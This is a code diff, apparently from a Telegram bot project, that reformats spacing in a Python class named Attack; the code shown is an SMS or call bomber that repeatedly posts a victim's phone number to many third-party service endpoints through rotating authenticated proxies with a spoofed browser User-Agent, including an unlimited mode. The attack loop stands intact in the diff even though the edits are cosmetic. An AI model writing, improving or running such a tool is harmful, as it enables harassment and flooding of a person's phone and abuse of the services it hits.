@@ -15,8 +15,8 @@ from formats.decode_host import decode_host
 
 @logger.catch
 class Attack:
-    phone:str
-    user_id:int
+    phone: str
+    user_id: int
 
     def __init__(self, phone="", user_id=None):
         """Initialization
@@ -34,9 +34,9 @@ class Attack:
         self.state_cirlces: int = 0
         self.user_data = None
         self.session: Session = Session()
-        self.headers = {"User-Agent":("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
-                "AppleWebKit/537.36 (KHTML, like Gecko) "
-                "Chrome/93.0.4577.63 Safari/537.36")}
+        self.headers = {"User-Agent": ("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
+                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
+                                       "Chrome/93.0.4577.63 Safari/537.36")}
 
     async def start(self, message: Message):
         """Start attack
@@ -57,7 +57,7 @@ class Attack:
             await globals.bot.delete_message(chat_id=message.chat.id, message_id=message.message_id+1)
             return await message.answer(text="🗑Количество кругов израсходовано!")
         else:
-            self.state_circles:int = int(circles_status)
+            self.state_circles: int = int(circles_status)
 
         # Load all proxies
         with open(r"sites/proxies.json") as proxies_load:
@@ -70,16 +70,17 @@ class Attack:
         # Run attack process
         while self.process_status:
             proxy = choice(list(proxies.keys()))
-            proxy_url = {"http":"http://%s:%s@%s" % (proxies[proxy][0], proxies[proxy][1], proxy,)}
+            proxy_url = {"http": "http://%s:%s@%s" %
+                         (proxies[proxy][0], proxies[proxy][1], proxy,)}
             self.session.proxies.update(proxy_url)
             self.session.headers.update(self.headers)
 
             if self.state_circles != "∞":
                 # Update count circles (auto stoping)
-                await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone) 
+                await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone)
                 return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
 
-            for (k,v) in services.items():
+            for (k, v) in services.items():
                 try:
                     if "data" in v.keys():
                         url = v["url"] % decode_host(k)
@@ -90,14 +91,14 @@ class Attack:
                         json = (v["json"] % self.phone).replace("'", "\"")
                         self.session.post(url=url, json=json, timeout=2)
                     else:
-                        url = v["url"] % (decode_host(k), self.phone,) # Url
+                        url = v["url"] % (decode_host(k), self.phone,)  # Url
                         self.session.post(url=url, timeout=2)
                 except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
                     pass
 
-            await sleep(3) # Time-out
+            await sleep(3)  # Time-out
             if circles_status != "∞":
-                self.state_circles-=1
+                self.state_circles -= 1
 
     async def stop(self):
         """Stop attack"""
@@ -106,4 +107,4 @@ class Attack:
         await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone)
 
         self.process_status = False       # Change process status
-        await self.client_session.close() # Stop process attack
+        await self.client_session.close()  # Stop process attack
